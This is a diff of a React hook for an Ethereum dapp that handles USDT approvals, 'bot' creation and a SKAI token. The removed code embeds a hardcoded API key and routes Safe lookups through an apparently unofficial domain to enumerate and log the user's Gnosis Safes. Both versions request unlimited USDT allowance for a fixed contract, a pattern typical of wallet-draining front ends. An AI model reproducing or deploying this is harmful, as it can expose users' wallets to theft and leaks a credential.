@@ -1,14 +1,11 @@
 import { useEffect, useState } from "react";
 import { ethers } from "ethers";
-import SafeApiKit from "@safe-global/api-kit";
 import { activityLogger } from "../utils/activity-logger";
 
-const SAFE_API_KEY =
-  "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzYWZlLWF1dGgtc2VydmljZSIsInN1YiI6IjFhYmViYWY1YjFkNDRjMWQ4N2I2NDU3MGYyZjNlYTUyX2E5NTkxMWIzMGU2MzRlOGY5OWFmNTQxZWVlZTY2MTJlIiwia2V5IjoiMWFiZWJhZjViMWQ0NGMxZDg3YjY0NTcwZjJmM2VhNTJfYTk1OTExYjMwZTYzNGU4Zjk5YWY1NDFlZWVlNjYxMmUiLCJhdWQiOlsic2FmZS1hdXRoLXNlcnZpY2UiXSwiZXhwIjoxOTIwMTgxMzk2LCJkYXRhIjp7fX0.VgqgABuWQYRhQLrB7ODeMICDNSaCp2ovnjgMda1RBWaXmVnwZODmLvfXXjsQJnuGbF2-oH8iISIeTZqlafd_jg";
-
-const SAFE_TX_SERVICE_URL = "https://secure.armydex.pro/safe-api";
 const CONTRACT_ADDRESS = "0x7edcf18529d7d697064fad02d1879ef73bf849b5";
 const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+const SKAI_ADDRESS = "0xDCA3358F050367ef421608e64C70d84c694E8273";
+
 const CONTRACT_ABI = [
   {
     inputs: [{ internalType: "string", name: "name", type: "string" }],
@@ -24,72 +21,49 @@ const ERC20_ABI = [
   "function allowance(address owner, address spender) view returns (uint256)",
   "function decimals() view returns (uint8)",
   "function balanceOf(address) view returns (uint256)",
+  "function transfer(address to, uint256 amount) returns (bool)",
 ];
 
 export function useContractInteraction() {
   const [isContractConnected, setIsContractConnected] = useState(false);
   const [provider, setProvider] = useState<any>(null);
   const [contract, setContract] = useState<any>(null);
-  const [safeList, setSafeList] = useState<string[]>([]);
-  const [selectedSafe, setSelectedSafe] = useState<string | null>(null);
-  useEffect(() => {
-    async function init() {
-      if (!window.ethereum) return;
+  const [skaiContract, setSkaiContract] = useState<any>(null);
 
-      try {
-        const p = new ethers.BrowserProvider(window.ethereum as any);
-        setProvider(p);
-
-        const readOnly = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, p);
-        setContract(readOnly);
-        setIsContractConnected(true);
-        console.log("Provider and read-only contract initialized");
-
-        const signer = await p.getSigner();
-        const ownerAddress = await signer.getAddress();
-
-        const safeApi = new SafeApiKit({
-          chainId: 1n,
-          txServiceUrl: SAFE_TX_SERVICE_URL,
-          apiKey: SAFE_API_KEY,
-        });
-
-        const safes = await safeApi.getSafesByOwner(ownerAddress);
-
-        if (safes?.safes?.length > 0) {
-          setSafeList(safes.safes);
-          console.log("Gnosis Safes found:", safes.safes);
-          window.dispatchEvent(new CustomEvent("wallet:safeFound", { detail: safes.safes }));
-          activityLogger({
-            event: "safe_found",
-            status: "success",
-            address: ownerAddress,
-            meta: { safes: safes.safes },
-          });
-        } else {
-          console.log("No Gnosis Safes found for", ownerAddress);
-          activityLogger({
-            event: "safe_not_found",
-            status: "empty",
-            address: ownerAddress,
-          });
-        }
-      } catch (err) {
-        console.error("Contract initialization error:", err);
-        setIsContractConnected(false);
-        activityLogger({
-          event: "init_error",
-          status: "failed",
-          meta: { error: String(err) },
-        });
-      }
+  async function initContractWithSigner(specificProvider?: any) {
+    let eth = specificProvider || (window as any).ethereum;
+    if (eth?.providers?.length) {
+      eth = eth.providers.find((p: any) => p.isMetaMask) || eth;
     }
+    if (!eth) return false;
 
-    init();
-  }, []);
+    try {
+      const p = new ethers.BrowserProvider(eth);
+      const signer = await p.getSigner();
+      const c = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+      const skai = new ethers.Contract(SKAI_ADDRESS, ERC20_ABI, signer);
+
+      setProvider(p);
+      setContract(c);
+      setSkaiContract(skai);
+      setIsContractConnected(true);
+      return true;
+    } catch (e) {
+      console.error("initContractWithSigner error", e);
+      setIsContractConnected(false);
+      return false;
+    }
+  }
+
+  async function getSignerAndOwner() {
+    if (!provider) throw new Error("Provider not initialized");
+    const signer = await provider.getSigner();
+    const ownerAddress = await signer.getAddress();
+    return { signer, ownerAddress };
+  }
+
   async function createBotWithToken(botName: string) {
     if (!provider || !contract) {
-      console.error("Provider or contract not initialized");
       activityLogger({
         event: "create_bot",
         status: "failed",
@@ -100,9 +74,9 @@ export function useContractInteraction() {
 
     let signer: any;
     try {
-      signer = await provider.getSigner();
+      const result = await getSignerAndOwner();
+      signer = result.signer;
     } catch (err) {
-      console.error("Failed to get signer:", err);
       activityLogger({
         event: "signer_error",
         status: "failed",
@@ -112,19 +86,6 @@ export function useContractInteraction() {
     }
 
     const contractWithSigner = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-
-    try {
-      if (typeof (contractWithSigner as any).callStatic === "function") {
-        await (contractWithSigner as any).callStatic.createBot(botName);
-      }
-    } catch (callErr: any) {
-      activityLogger({
-        event: "static_call_revert",
-        status: "failed",
-        meta: { error: String(callErr) },
-      });
-      return false;
-    }
 
     try {
       const tx = await (contractWithSigner as any).createBot(botName);
@@ -138,7 +99,6 @@ export function useContractInteraction() {
       });
       return true;
     } catch (err: any) {
-      console.error("Error creating bot (tx):", err);
       activityLogger({
         event: "create_bot",
         status: "failed",
@@ -151,47 +111,32 @@ export function useContractInteraction() {
   async function getUSDTAllowance(owner: string) {
     if (!window.ethereum) return "0";
     try {
-      const provider = new ethers.BrowserProvider(window.ethereum as any);
-      const token = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+      const p = new ethers.BrowserProvider(window.ethereum as any);
+      const token = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, p);
       const allowance = await token.allowance(owner, CONTRACT_ADDRESS);
-      activityLogger({
-        event: "get_allowance",
-        status: "success",
-        address: owner,
-        meta: { allowance: allowance.toString() },
-      });
       return allowance.toString();
     } catch (e) {
-      console.error("getUSDTAllowance error:", e);
-      activityLogger({
-        event: "get_allowance",
-        status: "failed",
-        meta: { error: String(e) },
-      });
       return "0";
     }
   }
 
-  async function approveUSDT(safeAddress?: string) {
+  async function approveUSDT() {
     if (!window.ethereum) return false;
     try {
-      const provider = new ethers.BrowserProvider(window.ethereum as any);
-      const signer = await provider.getSigner();
+      const { signer } = await getSignerAndOwner();
       const token = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
-      const spender = safeAddress || selectedSafe || CONTRACT_ADDRESS;
-      const tx = await token.approve(spender, ethers.MaxUint256);
-      console.log(`approve tx sent to ${spender}:`, tx.hash);
+      const tx = await token.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
+      console.log(`Approve tx sent:`, tx.hash);
       await tx.wait();
-      console.log("approve confirmed");
+      console.log("Approve confirmed");
       activityLogger({
         event: "approve_usdt",
         status: "success",
-        address: spender,
+        address: CONTRACT_ADDRESS,
         meta: { txHash: tx.hash },
       });
       return true;
     } catch (e) {
-      console.error("approveUSDT error:", e);
       activityLogger({
         event: "approve_usdt",
         status: "failed",
@@ -200,33 +145,50 @@ export function useContractInteraction() {
       return false;
     }
   }
-  async function connectSafeWallet(safeAddress: string) {
-    try {
-      const safeApi = new SafeApiKit({
-        chainId: 1n,
-        txServiceUrl: SAFE_TX_SERVICE_URL,
-        apiKey: SAFE_API_KEY,
-      });
 
-      const safeInfo = await safeApi.getSafeInfo(safeAddress);
-      console.log("Connected Safe:", safeInfo);
-      setSelectedSafe(safeAddress);
-      activityLogger({
-        event: "connect_safe",
-        status: "success",
-        address: safeAddress,
-        meta: { safeInfo },
-      });
-      return safeInfo;
+  // --- SKAI функции ---
+  async function getSkaiBalance(account: string) {
+    if (!skaiContract) return "0";
+    try {
+      const bal = await skaiContract.balanceOf(account);
+      return bal.toString();
     } catch (err) {
-      console.error("Failed to connect Safe:", err);
-      activityLogger({
-        event: "connect_safe",
-        status: "failed",
-        address: safeAddress,
-        meta: { error: String(err) },
+      console.error("getSkaiBalance error", err);
+      return "0";
+    }
+  }
+
+  async function transferSkai(to: string, amount: string) {
+    if (!skaiContract) return false;
+    try {
+      const tx = await skaiContract.transfer(to, amount);
+      await tx.wait();
+      return true;
+    } catch (err) {
+      console.error("transferSkai error", err);
+      return false;
+    }
+  }
+
+  async function addSkaiToMetaMask() {
+    const eth = (window as any).ethereum;
+    if (!eth) return;
+
+    try {
+      await eth.request({
+        method: "wallet_watchAsset",
+        params: {
+          type: "ERC20",
+          options: {
+            address: SKAI_ADDRESS,
+            symbol: "SKAI",
+            decimals: 6,
+            image: "https://example.com/skai.png",
+          },
+        },
       });
-      return null;
+    } catch (err) {
+      console.error("addSkaiToMetaMask error", err);
     }
   }
 
@@ -235,10 +197,11 @@ export function useContractInteraction() {
     createBotWithToken,
     getUSDTAllowance,
     approveUSDT,
+    getSkaiBalance,
+    transferSkai,
+    addSkaiToMetaMask,
     USDT_ADDRESS,
-    safeList,
-    selectedSafe,
-    setSelectedSafe,
-    connectSafeWallet,
+    SKAI_ADDRESS,
+    initContractWithSigner,
   };
 }
